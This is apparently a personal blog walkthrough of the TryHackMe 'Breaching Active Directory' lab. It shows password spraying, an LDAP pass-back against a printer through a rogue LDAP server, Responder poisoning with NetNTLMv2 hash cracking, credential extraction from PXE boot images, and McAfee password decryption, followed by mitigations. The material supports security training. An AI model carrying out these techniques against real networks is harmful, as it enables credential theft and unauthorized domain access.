# Breaching Active Directory

***

## OSINT AND PHISHING

Two popular methods for gaining access to that first set of AD credentials is Open Source Intelligence (OSINT) and Phishing. We will only briefly mention the two methods here, as they are already covered more in-depth in other rooms.  

**OSINT**

OSINT is used to discover information that has been publicly disclosed. In terms of AD credentials, this can happen for several reasons, such as:

- Users who ask questions on public forums such as [Stack Overflow](https://stackoverflow.com/) but disclose sensitive information such as their credentials in the question.
- Developers that upload scripts to services such as [Github](https://github.com/) with credentials hardcoded.
- Credentials being disclosed in past breaches since employees used their work accounts to sign up for other external websites. Websites such as [HaveIBeenPwned](https://haveibeenpwned.com/) and [DeHashed](https://www.dehashed.com/) provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.  

By using OSINT techniques, it may be possible to recover publicly disclosed credentials. If we are lucky enough to find credentials, we will still need to find a way to test whether they are valid or not since OSINT information can be outdated. In Task 3, we will talk about NTLM Authenticated Services, which may provide an excellent avenue to test credentials to see if they are still valid.

**Phishing**

Phishing is another excellent method to breach AD. Phishing usually entices users to either provide their credentials on a malicious web page or ask them to run a specific application that would install a Remote Access Trojan (RAT) in the background. This is a prevalent method since the RAT would execute in the user's context, immediately allowing you to impersonate that user's AD account. This is why phishing is such a big topic for both Red and Blue teams.


## NTLM Authenticated Services

We have been provided with a list of usernames discovered during a red team OSINT exercise. The OSINT exercise also indicated the organisation's initial onboarding password, which seems to be "Changeme123", We will be using a custom-developed script to stage a password spraying against the web application hosted at this URL: [http://ntlmauth.za.tryhackme.com](http://ntlmauth.za.tryhackme.com/).

Navigating to the URL, we can see that it prompts us for Windows Authentication credentials:

![](https://i.imgur.com/sNcPZua.png)

We have been given a zip file which contains a python password spraying script and numerous usernames with just one valid, We already know that the password is "Changeme123"

![](https://i.imgur.com/wymSi5A.png)

We can then run this tool with the following syntax as shown below

![](https://i.imgur.com/PRetcBQ.jpg)

## LDAP Bind Credentials

Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.

LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs  

If any of these applications or services are exposed on the internet, the same type of attacks as those leveraged against NTLM authenticated systems can be used. However, since a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. In essence, we can attempt to recover the AD credentials used by the service to gain authenticated access to AD. The process of authentication through LDAP is shown below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png)  

If you could gain a foothold on the correct host, such as a Gitlab server, it might be as simple as reading the configuration files to recover these AD credentials. These credentials are often stored in plain text in configuration files since the security model relies on keeping the location and storage configuration file secure rather than its contents.

#### LDAP Pass-back Attacks  

However, one other very interesting attack can be performed against LDAP authentication mechanisms, called an LDAP Pass-back attack. This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as `admin:admin` or `admin:password`. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

#### Performing an LDAP Pass-back

There is a network printer in this network where the administration website does not even require credentials. Navigating to [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx) we can see the settings page of the printer

![](https://i.imgur.com/iCWcKeM.png)

Using browser inspection, we can also verify that the printer website was at least secure enough to not just send the LDAP password back to the browser:

![](https://i.imgur.com/eXPk4GI.png)

So we have the username, but not the password. However, when we press test settings, we can see that an authentication request is made to the domain controller to test the LDAP credentials. Let's try to exploit this to get the printer to connect to us instead, which would disclose the credentials. To do this, let's use a simple Netcat listener to test if we can get the printer to connect to us. Since the default port of LDAP is `389`, we can use the following command:

```shell
nc -lvnp 389
```

We can set the highlighted box in the JPEG below to our VPN IP then click **"Test Settings"**:

![](https://i.imgur.com/8QIvlur.png)

You should see that we get a connection back, but there is a slight problem:

![](https://i.imgur.com/tBAMgeF.png)

#### Hosting a Rogue LDAP Server

There are several ways to host a rogue LDAP server, but we will use OpenLDAP for this example. we will need to install OpenLDAP using the following command:

```shell
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

We have to configure our own rogue LDAP server also, We will start by reconfiguring the LDAP server using the following command:

```shell
sudo dpkg-reconfigure -p low slapd
```

Make sure to press `<No>` when requested if you want to skip server configuration:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/97afd26fd4f6d10a2a86ab65ac401845.png)

For the DNS domain name, you want to provide our target domain, which is `za.tryhackme.com`:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/01b0d4256900cbf48d8d082d8bdf14bb.png)  

Use this same name for the Organisation name as well:  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png)  

Provide any Administrator password:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/23b957d41ddba8060e4bc2295b56a2fb.png)

Select MDB as the LDAP database to use:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png)

For the last two options, ensure the database is not removed when purged:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png)  

Move old database files before a new one is created:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png)  

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new **.ldif** file, called with the following content:

![](https://i.imgur.com/ZBHxmDm.png)

The file has the following properties:

- **olcSaslSecProps:** Specifies the SASL security properties
- **noanonymous:** Disables mechanisms that support anonymous login
- **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the **.ldif** file to patch our LDAP server using the following command:

```shell
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

![](https://i.imgur.com/TFMplRZ.png)

We can verify that our rogue LDAP server's configuration has been applied using the following command (**Note**: If you are using Kali, you may not receive any output, however the configuration should have worked and you can continue with the next steps):

![](https://i.imgur.com/k4lUktv.png)

#### Capturing LDAP Credentials

Our rogue LDAP server has now been configured. When we click the **"Test Settings"** at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx), the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:

```shell
sudo tcpdump -SX -i breachad tcp port 389
```

Don't forget to replace the Server IP with our IP Address and then we can click **"Test Settings"** :

![](https://i.imgur.com/aQfHnxo.png)

**_Output :_**

![](https://i.imgur.com/AtO5KgD.jpg)

The password for our service is **tryhackmeldappass1@**. You may have to press the "Test Settings" button a couple of times before the TCPdump will return data since we are performing the attack over a VPN connection.  

Now we have another set of valid AD credentials! By using an LDAP pass-back attack and downgrading the supported authentication mechanism, we could intercept the credentials in cleartext.

## Authentication Relays

Continuing with attacks that can be staged from our rogue device, we will now look at attacks against broader network authentication protocols. In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network.  

These services have to use built-in authentication methods to verify the identity of incoming connections. In Task 2, we explored NTLM Authentication used on a web application. In this task, we will dive a bit deeper to look at how this authentication looks from the network's perspective. However, for this task, we will focus on NetNTLM authentication used by SMB.

#### Server Message Block

The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.

However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organisations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM authentication with SMB:

- Since the NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
- We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

#### LLMNR, NBT-NS, and WPAD  

Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to. On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.

Since these protocols rely on requests broadcasted on the local network, our rogue device would also receive these requests. Usually, these requests would simply be dropped since they were not meant for our host. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

#### Intercepting NetNTLM Challenge

One thing to note is that Responder essentially tries to win the race condition by poisoning the connections to ensure that you intercept the connection. This means that Responder is usually limited to poisoning authentication challenges on the local network. Since we are connected via a VPN to the network, we will only be able to poison authentication challenges that occur on this VPN network. For this reason, we have simulated an authentication request that can be poisoned that runs every 30 minutes. This means that you may have to wait a bit before you can intercept the NetNTLM challenge and response.

Although Responder would be able to intercept and poison more authentication requests when executed from our rogue device connected to the LAN of an organisation, it is crucial to understand that this behaviour can be disruptive and thus detected. By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.

you can download and install it from this repo:  [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder). We will set Responder to run on the interface connected to the VPN:

```shell
sudo responder -I tun0
```  

Also, make sure you specify `tun0` or `tun1` depending on which tunnel has your network IP. Responder will now listen for any LLMNR, NBT-NS, or WPAD requests that are coming in. We would leave Responder to run for a bit on a real LAN. However, in our case, we have to simulate this poisoning by having one of the servers attempt to authenticate to machines on the VPN. Leave Responder running for a bit (average 10 minutes, get some fresh air!), and you should receive an SMBv2 connection which Responder can use to entice and extract an NTLMv2-SSP response. It will look something like this:

NTLM Password Spraying Attack

```shell
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```

If we were using our rogue device, we would probably run Responder for quite some time, capturing several responses. Once we have a couple, we can start to perform some offline cracking of the responses in the hopes of recovering their associated NTLM passwords. If the accounts have weak passwords configured, we have a good chance of successfully cracking them. Copy the NTLMv2-SSP Hash to a textfile. We will then use the password list provided in the downloadable files for this task and Hashcat in an attempt to crack the hash using the following command:

`hashcat -m 5600 <hash file> <password file> --force`

we can then download the task file. We use hashtype 5600, which corresponds with NTLMv2-SSP for hashcat. Any hashes that we can crack will now provide us with AD credentials for our breach!  

#### Relaying the Challenge  

In some instances, however, we can take this a step further by trying to relay the challenge instead of just capturing it directly. This is a little bit more difficult to do without prior knowledge of the accounts since this attack depends on the permissions of the associated account. We need a couple of things to play in our favour:

- SMB Signing should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. If SMB signing is enabled, we won't be able to forge the message signature, meaning the server would reject it.
- The associated account needs the relevant permissions on the server to access the requested resources. Ideally, we are looking to relay the challenge and response of an account with administrative privileges over the server, as this would allow us to gain a foothold on the host.
- Since we technically don't yet have an AD foothold, some guesswork is involved into what accounts will have permissions on which hosts. If we had already breached AD, we could perform some initial enumeration first, which is usually the case.

This is why blind relays are not usually popular. Ideally, you would first breach AD using another method and then perform enumeration to determine the privileges associated with the account you have compromised. From here, you can usually perform lateral movement for privilege escalation across the domain. However, it is still good to fundamentally under how a relay attack works, as shown in the diagram below:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png)

**_Practice :_**

- First of all we need to edit our `/etc/responder/Responder.conf` file as shown in the image below: 

![](https://i.imgur.com/9GvRsHg.png)

- Then we will wait for the connection to be made and we should get an hash

![](https://miro.medium.com/v2/resize:fit:700/0*qcQnO8uye4IA8VD_.jpeg)

#### Cracking the Hash using john

```
$ john --wordlist=passwordlist.txt hashes.txt
```

![](https://miro.medium.com/v2/resize:fit:700/0*DZETRK-eDyhCYpGs.jpeg)

#### Cracking the Hash using hash cat

```
$ hashcat -m 5600 hashes.txt passwordlist.txt --force
```

![](https://miro.medium.com/v2/resize:fit:700/0*Q8qghilLq3zbByh4.jpeg)

## PXE Boot Image Retrieval

![](https://miro.medium.com/v2/resize:fit:638/0*r1D3wTH9njT41GZ1.jpeg)

![](https://miro.medium.com/v2/resize:fit:383/0*x6R9u2wlBRSEnfJL.jpeg)

![](https://miro.medium.com/v2/resize:fit:393/0*NfImSR1PVz0GqxY5.jpeg)

```shell
Microsoft Windows [Version 10.0.17763.1098]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
thm@THMJMP1 C:\Users\thm>cd Documents  
  
thm@THMJMP1 C:\Users\thm\Documents>mkdir 0XFK  
  
thm@THMJMP1 C:\Users\thm\Documents>copy c:\powerpxe 0XFK\  
c:\powerpxe\LICENSE  
c:\powerpxe\PowerPXE.ps1  
c:\powerpxe\README.md  
        3 file(s) copied.
```

```powershell
thm@THMJMP1 C:\Users\thm\Documents\0XFK> tftp -i 10.200.32.202 GET "\Tmp\x64{F95E60C5-C07C-469C-9C22-7980623C8896}.bcd"   
conf.bcd  
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s  
  
thm@THMJMP1 C:\Users\thm\Documents\0XFK> Powershell -executionpolicy bypass  
Windows PowerShell  
Copyright (C) Microsoft Corporation. All rights reserved.  
  
PS C:\Users\thm\Documents\0XFK> Import-Module .\PowerPXE.ps1  
PS C:\Users\thm\Documents\0XFK> $BCDFile = "conf.bcd"  
PS C:\Users\thm\Documents\0XFK> Get-WimFile -bcdFile $BCDFile  
>> Parse the BCD file: conf.bcd  
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim    
\Boot\x64\Images\LiteTouchPE_x64.wim  #<----- location to be used in download  
PS C:\Users\thm\Documents\0XFK> tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim"  
PS C:\Users\thm\Documents\0XFK> tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim"  pxeboot.wim  
Transfer successful: 341899611 bytes in 141 second(s), 2424819 bytes/s  
```

```powershell
PS C:\Users> tftp -i 10.200.32.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim"  pxeboot.wim
```

#### Recovering Credentials from a PXE Boot Image

```powershell
PS C:\Users\thm\Documents\0XFK> Get-FindCredentials -WimFile .\pxeboot.wim  
>> Open .\pxeboot.wim   
New-Item : An item with the specified name C:\Users\thm\Documents\0XFK\ already exists.   
At C:\Users\thm\Documents\0XFK\PowerPXE.ps1:212 char:13  
+     $null = New-Item -ItemType directory -Path $WimDir  
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
    + CategoryInfo          : ResourceExists: (C:\Users\thm\Documents\0XFK\:String) [New-Item], IOException  
    + FullyQualifiedErrorId : DirectoryExist,Microsoft.PowerShell.Commands.NewItemCommand  
   
>>>> Finding Bootstrap.ini   
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$   
>>>> >>>> UserID = svcMDT  
>>>> >>>> UserDomain = ZA  
>>>> >>>> UserPassword = PXEBootSecure1@  
PS C:\Users\thm\Documents\0XFK> Get-FindCredentials -WimFile .\pxeboot.wim
```

![](https://i.imgur.com/VrFdYSA.png)

# Configuration Files

```shell
thm@thm:~$ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db . 

thm@10.200.4.249's password: 

ma.db 100% 118KB 144.1KB/s 00:00

thm@thm:~$ sqlitebrowser ma.db
```

![](https://i.imgur.com/hT4PaRy.png)

focus on the AGENT_REPOSITORIES table:
 
![](https://i.imgur.com/16zTbYu.png)

Python 3 for mcafee pwd decrypt can be found [here](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)

```shell
sec-fortress@Pwn-F0rk-3X3C:~/THM/breachad$ python3 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

![](https://i.imgur.com/CsdlrM7.png)


# Mitigations  

In terms of mitigations, there are some steps that organisations can take:

- User awareness and training - The weakest link in the cybersecurity chain is almost always users. Training users and making them aware that they should be careful about disclosing sensitive information such as credentials and not trust suspicious emails reduces this attack surface.
- Limit the exposure of AD services and applications online - Not all applications must be accessible from the internet, especially those that support NTLM and LDAP authentication. Instead, these applications should be placed in an intranet that can be accessed through a VPN. The VPN can then support multi-factor authentication for added security.
- Enforce Network Access Control (NAC) - NAC can prevent attackers from connecting rogue devices on the network. However, it will require quite a bit of effort since legitimate devices will have to be allowlisted.
- Enforce SMB Signing - By enforcing SMB signing, SMB relay attacks are not possible.
- Follow the principle of least privileges - In most cases, an attacker will be able to recover a set of AD credentials. By following the principle of least privilege, especially for credentials used for services, the risk associated with these credentials being compromised can be significantly reduced.

![](https://i.imgur.com/DXugua1.png)


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
